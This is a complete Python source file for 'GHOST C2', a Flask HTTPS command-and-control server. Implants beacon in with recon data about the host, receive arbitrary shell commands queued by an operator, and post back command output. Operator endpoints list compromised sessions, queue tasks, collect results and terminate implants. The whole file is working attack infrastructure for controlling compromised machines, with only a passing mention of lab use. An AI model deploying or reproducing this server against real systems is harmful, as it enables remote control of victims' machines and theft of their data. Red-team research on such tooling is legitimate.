"""
GHOST C2 Server
---------------
Flask-based HTTPS C2 listener.

Authentication:
  Two token tiers:
    BEACON_TOKEN  — used by implants in X-Beacon-Token header
    OPERATOR_TOKEN — used by the operator CLI in X-Operator-Token header

Set these via environment variables before starting:
    $env:GHOST_BEACON_TOKEN   = "..."
    $env:GHOST_OPERATOR_TOKEN = "..."

Generate secure tokens:
    python -c "import secrets; print(secrets.token_hex(32))"

TLS:
  Requires server.crt and server.key in the same directory.
  Generate self-signed for lab:
    openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj "/CN=localhost"
"""

import json
import logging
import os
import secrets
import ssl
import time
from collections import defaultdict
from datetime import datetime, timezone
from functools import wraps

from flask import Flask, jsonify, request
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

BEACON_TOKEN: str = os.environ.get("GHOST_BEACON_TOKEN", "")
OPERATOR_TOKEN: str = os.environ.get("GHOST_OPERATOR_TOKEN", "")
SESSION_TIMEOUT_SECONDS: int = int(os.environ.get("GHOST_SESSION_TIMEOUT", "600"))  # 10 min
OPERATOR_ORIGIN: str = os.environ.get("GHOST_OPERATOR_ORIGIN", "")  # e.g. https://127.0.0.1

if not BEACON_TOKEN or not OPERATOR_TOKEN:
    raise RuntimeError(
        "GHOST_BEACON_TOKEN and GHOST_OPERATOR_TOKEN must be set in environment. "
        "Generate with: python -c \"import secrets; print(secrets.token_hex(32))\""
    )

if BEACON_TOKEN == OPERATOR_TOKEN:
    raise RuntimeError("BEACON_TOKEN and OPERATOR_TOKEN must be different values.")

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("ghost_c2.log", encoding="utf-8"),
    ],
)
logger = logging.getLogger("ghost_c2")

# ---------------------------------------------------------------------------
# App setup
# ---------------------------------------------------------------------------

app = Flask(__name__)

# CORS: restrict to operator origin if configured, otherwise localhost only
cors_origins = [OPERATOR_ORIGIN] if OPERATOR_ORIGIN else ["https://127.0.0.1", "https://localhost"]
CORS(app, origins=cors_origins, supports_credentials=False)

# Rate limiting — beacon endpoints are more generous, operator endpoints stricter
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["200 per minute"],
    storage_uri="memory://",
)

# ---------------------------------------------------------------------------
# In-memory state
# ---------------------------------------------------------------------------

# session_id -> {
#     "last_beacon": float (unix time),
#     "first_seen":  float,
#     "recon":       dict,
#     "results":     list[str],
#     "remote_ip":   str,
# }
sessions: dict = {}

# session_id -> list[str]  (pending commands, FIFO)
tasks: dict = defaultdict(list)

# Operator action audit log
audit_log: list[dict] = []

# ---------------------------------------------------------------------------
# Auth decorators
# ---------------------------------------------------------------------------

def require_beacon_token(f):
    """Validates the X-Beacon-Token header on implant-facing routes."""
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get("X-Beacon-Token", "")
        if not secrets.compare_digest(token.encode(), BEACON_TOKEN.encode()):
            logger.warning("Beacon auth failure from %s", request.remote_addr)
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated


def require_operator_token(f):
    """Validates the X-Operator-Token header on operator-facing routes."""
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get("X-Operator-Token", "")
        if not secrets.compare_digest(token.encode(), OPERATOR_TOKEN.encode()):
            logger.warning("Operator auth failure from %s", request.remote_addr)
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def purge_stale_sessions() -> None:
    """Remove sessions that have not beaconed within SESSION_TIMEOUT_SECONDS."""
    now = time.time()
    stale = [sid for sid, info in sessions.items()
             if now - info["last_beacon"] > SESSION_TIMEOUT_SECONDS]
    for sid in stale:
        logger.info("Session timed out: %s", sid)
        sessions.pop(sid, None)
        tasks.pop(sid, None)


def log_operator_action(action: str, detail: dict) -> None:
    entry = {
        "ts": datetime.now(timezone.utc).isoformat(),
        "ip": request.remote_addr,
        "action": action,
        **detail,
    }
    audit_log.append(entry)
    logger.info("[OPERATOR] %s | %s", action, json.dumps(detail))

# ---------------------------------------------------------------------------
# Implant-facing routes
# ---------------------------------------------------------------------------

@app.route("/beacon", methods=["POST"])
@limiter.limit("120 per minute")
@require_beacon_token
def beacon():
    """
    Implant checks in, sends recon, receives next task.

    Request JSON:
        { "session": "<sid>", "recon": { "hostname": "...", "user": "...", ... } }

    Response JSON:
        { "cmd": "<command>" }   or   { "cmd": "sleep" }
    """
    data = request.get_json(silent=True)
    if not data or "session" not in data:
        return jsonify({"error": "Invalid"}), 400

    sid = str(data["session"])[:128]  # cap session ID length
    now = time.time()

    existing = sessions.get(sid, {})
    sessions[sid] = {
        "last_beacon": now,
        "first_seen": existing.get("first_seen", now),
        "recon": data.get("recon", {}),
        "results": existing.get("results", []),
        "remote_ip": request.remote_addr,
    }

    logger.info("Beacon from sid=%s ip=%s", sid, request.remote_addr)
    purge_stale_sessions()

    if tasks[sid]:
        cmd = tasks[sid].pop(0)
        logger.info("Tasked sid=%s cmd=%s", sid, cmd)
        return jsonify({"cmd": cmd})

    return jsonify({"cmd": "sleep"})


@app.route("/result", methods=["POST"])
@limiter.limit("120 per minute")
@require_beacon_token
def result():
    """
    Implant posts command output.

    Request JSON:
        { "session": "<sid>", "output": "<result string>" }
    """
    data = request.get_json(silent=True)
    if not data or "session" not in data or "output" not in data:
        return jsonify({"error": "Invalid"}), 400

    sid = str(data["session"])[:128]
    output = str(data["output"])[:65536]  # cap result size at 64 KB per entry

    if sid not in sessions:
        # Accept result even if session was purged; re-register it minimally
        sessions[sid] = {
            "last_beacon": time.time(),
            "first_seen": time.time(),
            "recon": {},
            "results": [],
            "remote_ip": request.remote_addr,
        }

    sessions[sid]["results"].append({
        "ts": datetime.now(timezone.utc).isoformat(),
        "output": output,
    })
    logger.info("Result received sid=%s len=%d", sid, len(output))
    return jsonify({"status": "ok"})

# ---------------------------------------------------------------------------
# Operator-facing routes
# ---------------------------------------------------------------------------

@app.route("/sessions", methods=["GET"])
@limiter.limit("60 per minute")
@require_operator_token
def list_sessions():
    """List all active sessions with metadata."""
    purge_stale_sessions()
    out = []
    now = time.time()
    for sid, info in sessions.items():
        out.append({
            "session": sid,
            "remote_ip": info["remote_ip"],
            "first_seen": datetime.fromtimestamp(info["first_seen"], tz=timezone.utc).isoformat(),
            "last_beacon": datetime.fromtimestamp(info["last_beacon"], tz=timezone.utc).isoformat(),
            "idle_seconds": round(now - info["last_beacon"], 1),
            "recon": info["recon"],
            "pending_tasks": len(tasks.get(sid, [])),
            "result_count": len(info["results"]),
        })
    log_operator_action("list_sessions", {"count": len(out)})
    return jsonify(out)


@app.route("/task", methods=["POST"])
@limiter.limit("60 per minute")
@require_operator_token
def add_task():
    """
    Queue a command for a session.

    Request JSON:
        { "session": "<sid>", "cmd": "<command string>" }
    """
    data = request.get_json(silent=True)
    if not data or "session" not in data or "cmd" not in data:
        return jsonify({"error": "Missing fields"}), 400

    sid = str(data["session"])[:128]
    cmd = str(data["cmd"])[:4096]

    if sid not in sessions:
        return jsonify({"error": "Session not found"}), 404

    tasks[sid].append(cmd)
    log_operator_action("task_queued", {"session": sid, "cmd": cmd})
    return jsonify({"status": "queued", "queue_depth": len(tasks[sid])})


@app.route("/results/<sid>", methods=["GET"])
@limiter.limit("60 per minute")
@require_operator_token
def get_results(sid: str):
    """
    Retrieve and clear stored results for a session.

    Query param: ?keep=1 to retrieve without clearing.
    """
    if sid not in sessions:
        return jsonify({"error": "Session not found"}), 404

    results = sessions[sid]["results"]
    keep = request.args.get("keep", "0") == "1"
    if not keep:
        sessions[sid]["results"] = []

    log_operator_action("get_results", {"session": sid, "count": len(results), "keep": keep})
    return jsonify({"session": sid, "results": results})


@app.route("/sessions/<sid>", methods=["DELETE"])
@limiter.limit("30 per minute")
@require_operator_token
def kill_session(sid: str):
    """Queue an 'exit' command and remove the session record."""
    if sid not in sessions:
        return jsonify({"error": "Session not found"}), 404

    # Queue exit so the implant terminates cleanly on next beacon
    tasks[sid].insert(0, "exit")
    log_operator_action("kill_session", {"session": sid})
    return jsonify({"status": "exit_queued", "session": sid})


@app.route("/audit", methods=["GET"])
@limiter.limit("20 per minute")
@require_operator_token
def get_audit_log():
    """Return in-memory operator audit log."""
    limit = min(int(request.args.get("limit", 100)), 1000)
    log_operator_action("audit_viewed", {"limit": limit})
    return jsonify({"entries": audit_log[-limit:]})


@app.route("/health", methods=["GET"])
def health():
    """Unauthenticated health check — returns 200 only."""
    return jsonify({"status": "ok"}), 200

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    cert_path = os.path.join(os.path.dirname(__file__), "server.crt")
    key_path = os.path.join(os.path.dirname(__file__), "server.key")

    if not os.path.exists(cert_path) or not os.path.exists(key_path):
        raise FileNotFoundError(
            "server.crt / server.key not found. Generate with:\n"
            "  openssl req -x509 -newkey rsa:4096 -keyout server.key "
            "-out server.crt -days 365 -nodes -subj '/CN=localhost'"
        )

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.load_cert_chain(cert_path, key_path)

    logger.info("GHOST C2 server starting on 0.0.0.0:443")
    app.run(host="0.0.0.0", port=443, ssl_context=context, threaded=True)